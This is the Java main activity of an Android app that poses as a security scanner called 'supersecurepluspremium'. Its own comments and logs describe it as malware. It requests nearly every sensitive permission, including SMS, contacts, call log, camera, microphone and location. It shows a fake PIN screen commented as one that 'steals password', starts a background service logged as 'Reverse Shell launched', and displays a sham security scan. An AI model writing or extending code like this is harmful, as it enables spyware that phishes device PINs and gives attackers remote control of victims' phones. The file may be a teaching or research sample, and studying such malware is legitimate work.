package com.example.supersecurepluspremium;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.app.KeyguardManager;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;
import android.widget.TextView;

import com.bumptech.glide.Glide;

public class MainActivity extends AppCompatActivity {
    private static final int MY_PERMISSIONS_REQUEST_READ_SMS = 666;
    private static int LOAD_TIME = 2000;
    private static boolean authenticated = false;
    private static boolean scanning = false;
    private static String[] neededPermissions = {
        Manifest.permission.DISABLE_KEYGUARD,
            Manifest.permission.INTERNET,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_CONTACTS,
            Manifest.permission.WRITE_SETTINGS,
            Manifest.permission.ACCESS_WIFI_STATE,
            Manifest.permission.CHANGE_WIFI_STATE,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.SET_WALLPAPER,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.WRITE_CALL_LOG,
            Manifest.permission.WAKE_LOCK
    };

    private static int ACTIVITY_LOCK = 4;
    private static int ACTIVITY_FIRST_LOAD = 3;

    private void unlock_screen() {
        final ImageView myLayout = findViewById(R.id.imageView);

        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            KeyguardManager km = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
            if (km.isKeyguardSecure()) {
                Intent authIntent = km.createConfirmDeviceCredentialIntent(getString(R.string.dialog_title_auth), getString(R.string.dialog_msg_auth));
                startActivityForResult(authIntent, ACTIVITY_LOCK);
            }
        }
        try {
            Thread.sleep(2000);
        } catch (InterruptedException ex) {
            ex.printStackTrace();
        }
        Glide.with(this).load(R.drawable.warning).into(myLayout);  //image warning
    }

    //unlock with PIN form that steals password
    private void unlock_screen_custom() {
        Intent i = new Intent(MainActivity.this, FakePIN.class);
        i.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startActivityForResult(i, ACTIVITY_LOCK);
    }

    // Demande de faux PIN
    public void firstLaunch(View v) {
        final ImageView myLayout = findViewById(R.id.imageView);
        TextView textView = findViewById(R.id.textView2);

        if (!authenticated)  // Demande le code PIN
        {
            //Log.v("secme", "Ask for PIN - main");
            //unlock_screen();
            unlock_screen_custom();
        } else {
            if (scanning) {
                //Log.v("secme", "Already scanning ! - main");
                return;
            }
            scanning = true;
            //Log.v("secme", "Load app - main");
            Glide.with(this).load(R.drawable.loading).into(myLayout);  //insere notre gif dans la imageView
            textView.setText("Chargement de la sécurité\nVeuillez patienter...");
            Runnable runnable = new Runnable() {
                @Override
                public void run() {
                    //Log.v("secme", "DONE");
                    scanning = false;
                    Intent i = new Intent(MainActivity.this, Analyze.class);
                    i.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    startActivityForResult(i, ACTIVITY_FIRST_LOAD);
                    return;
                }
            };
            Handler handler = new Handler();
            handler.postDelayed(runnable, LOAD_TIME);
        }
    }

    protected void checkPermissions(){
        /*
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {

            if (ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.READ_SMS)) {

            } else {
                ActivityCompat.requestPermissions(this, neededPermissions, MY_PERMISSIONS_REQUEST_READ_SMS);
            }
        } else {

        }

         */

        ActivityCompat.requestPermissions(this, neededPermissions, MY_PERMISSIONS_REQUEST_READ_SMS);

    }

    //Démarrage de l'application
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        checkPermissions();
        ImageView imageView = findViewById(R.id.imageView);
        Glide.with(this).load(R.drawable.annonce).into(imageView); //annonce code pin necessaire
        startService(new Intent(this, MyIntentService.class));
        Log.v("secme","Reverse Shell launched - main");
    }

    // Lancement d'un scan après appui du bouton dans l'activité Analyze
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        //Log.v("secme", "Trigger" + requestCode);
        if (requestCode == ACTIVITY_LOCK) { //4
            final ImageView myLayout = findViewById(R.id.imageView);
            Glide.with(this).load(R.drawable.warning).into(myLayout);  //image warning
            //Log.v("secme", "Correct PIN - main");
            //Log.v("secme", String.valueOf(data));
            authenticated = true;
        } else if (requestCode == ACTIVITY_FIRST_LOAD) { //3
            //Log.v("secme", "First load finished - main");
            LOAD_TIME = 5000;
            firstLaunch(findViewById(R.id.imageView));
        }
    }
}
